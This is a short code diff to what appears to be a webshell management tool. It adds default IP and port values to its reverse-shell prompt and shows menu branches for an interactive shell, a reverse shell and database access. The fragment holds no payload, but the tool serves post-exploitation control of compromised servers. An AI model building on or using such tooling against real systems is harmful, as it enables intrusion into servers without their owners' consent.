@@ -52,8 +52,8 @@ def main():
             shell = Shell(webshell)
             shell.interactive()
         elif context == "rsh" or context == "rshell":
-            ip = raw_input("[IP] : ")
-            port = raw_input("[PORT] : ")
+            ip = raw_input("[IP] : ") or "127.0.0.1"
+            port = raw_input("[PORT] : ") or "8888"
             Log.info("Starting reverse shell (%s:%s)" % (ip, port))
             webshell.reverse_shell(ip, port)
         elif context == "db" or context == "database":
